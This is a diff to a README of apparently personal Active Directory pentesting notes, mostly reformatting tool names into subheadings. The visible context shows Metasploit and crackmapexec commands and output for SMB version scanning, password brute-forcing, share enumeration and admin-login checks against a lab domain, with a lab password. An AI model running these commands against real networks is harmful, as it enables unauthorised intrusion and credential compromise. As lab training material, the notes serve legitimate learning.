@@ -1,11 +1,20 @@
 This is a collection of notes about active directory and (post)exploitation
 
+
 - [Enumeration](#enumeration)
   * [Check smb version and server info](#check-smb-version-and-server-info)
+    + [metasploit](#metasploit)
+    + [crackmapexec](#crackmapexec)
   * [Enum Local users](#enum-local-users)
   * [Password Bruteforce](#password-bruteforce)
+    + [Metasploit](#metasploit)
+    + [Crackmapexec](#crackmapexec)
   * [Enum Shares](#enum-shares)
+    + [smb_enumshares (Metasploit)](#smb-enumshares--metasploit-)
+    + [crackmaexec (--shares)](#crackmaexec----shares-)
   * [Checking your rights for remote device](#checking-your-rights-for-remote-device)
+    + [SMB_Login (Metasploit)](#smb-login--metasploit-)
+    + [Crackmapexec](#crackmapexec-1)
   * [ms17_010_eternalblue](#ms17-010-eternalblue)
   * [Sharphound](#sharphound)
   * [Bloodhound](#bloodhound)
@@ -31,11 +40,12 @@ This is a collection of notes about active directory and (post)exploitation
 
 <small><i><a href='http://ecotrust-canada.github.io/markdown-toc/'>Table of contents generated with markdown-toc</a></i></small>
 
+
 # Enumeration
 
 ## Check smb version and server info
 
-metasploit
+### metasploit
 
 	msf6 auxiliary(scanner/smb/smb_version) > run
 	[*] 192.168.200.100:445   - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.0.2) (signatures:required) (uptime:15m 42s) (guid:{0e6e2ca3-2bd4-4307-8e35-70564748263c}) (authentication domain:VALHALLA)
@@ -45,7 +55,7 @@ metasploit
 	msf6 auxiliary(scanner/smb/smb_version) >
 
 
-crackmapexec
+### crackmapexec
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ crackmapexec smb 192.168.200.100 
@@ -70,7 +80,7 @@ crackmapexec
 
 ## Password Bruteforce
 
-Metasploit
+### Metasploit
 
 	msf6 auxiliary(scanner/smb/smb_login) > set pass_file pword.txt
 	pass_file => pword.txt
@@ -86,7 +96,7 @@ Metasploit
 	[*] Auxiliary module execution completed
 	
 	
-Crackmapexec
+### Crackmapexec
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ crackmapexec smb 192.168.200.100 -u thor -p pword.txt -d valhalla.local          
@@ -101,7 +111,7 @@ Crackmapexec
 
 ## Enum Shares
 
-smb_enumshares (Metasploit)
+### smb_enumshares (Metasploit)
 
 	msf6 auxiliary(scanner/smb/smb_enumshares) > set smbuser thor
 	smbuser => thor
@@ -125,7 +135,7 @@ smb_enumshares (Metasploit)
 	[*] Auxiliary module execution completed
 
 
-crackmaexec (--shares)
+### crackmaexec (--shares)
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ crackmapexec smb 192.168.200.100 -u thor -p Pass123! -d valhalla.local --shares
@@ -144,7 +154,7 @@ crackmaexec (--shares)
 
 ## Checking your rights for remote device
 
-SMB_Login (Metasploit)
+### SMB_Login (Metasploit)
 
 	msf6 auxiliary(scanner/smb/smb_login) > set smbuser administrator
 	smbuser => administrator
@@ -159,7 +169,7 @@ SMB_Login (Metasploit)
 	[*] Auxiliary module execution completed
 	msf6 auxiliary(scanner/smb/smb_login) > 
 	
-Crackmapexec
+### Crackmapexec
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ crackmapexec smb valhalla.local -u administrator -p Pass123!                                                                                   1 ⚙
